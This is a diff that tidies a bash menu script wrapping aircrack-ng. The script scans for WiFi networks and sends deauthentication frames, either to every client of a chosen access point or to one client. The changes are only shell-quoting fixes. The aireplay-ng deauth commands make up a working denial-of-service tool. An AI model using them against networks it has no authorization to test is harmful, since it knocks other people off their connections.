@@ -13,27 +13,26 @@ echo "1) Scan"
 echo "2) Kick everyone"
 echo "3) Kick a client"
 
-read -p "Now a number?: " menu
+read -rp "Now a number?: " menu
 
-if [ $menu == "1" ] ; then
+if [ "$menu" == "1" ] ; then
 echo "When you are finished scanning for wifi press ctrl+c"
 sleep 1s
 echo "Scan will start in 5 seconds..."
 sleep 5s
-airodump-ng mon0
-	if [ $? != "0" ] ; then
+	if ! airodump-ng mon0 ; then
 		echo "OH NO something went wrong. Please make sure your card is in monitor mode and try again."
 	exit 1
 	fi
 fi
 
-if [ $menu == "2" ] ; then
-	read -p "BSSID please in AA:BB;CC:DD:EE:FF format: " bssid
-	aireplay-ng mon0 -a $bssid --deauth 5 --ignore-negative-one
+if [ "$menu" == "2" ] ; then
+	read -rp "BSSID please in AA:BB;CC:DD:EE:FF format: " bssid
+	aireplay-ng mon0 -a "$bssid" --deauth 5 --ignore-negative-one
 fi
 
-if [ $menu == "3" ] ; then
-	read -p "BSSID please in AA:BB:CC:DD:EE:FF format: " bssid
-	read -p "Client MAC in AA:BB:CC:DD:EE:FF format : " client
-	aireplay-ng mon0 -a $bssid -c $client --deauth 5 --ignore-negative-one
+if [ "$menu" == "3" ] ; then
+	read -rp "BSSID please in AA:BB:CC:DD:EE:FF format: " bssid
+	read -rp "Client MAC in AA:BB:CC:DD:EE:FF format : " client
+	aireplay-ng mon0 -a "$bssid" -c "$client" --deauth 5 --ignore-negative-one
 fi
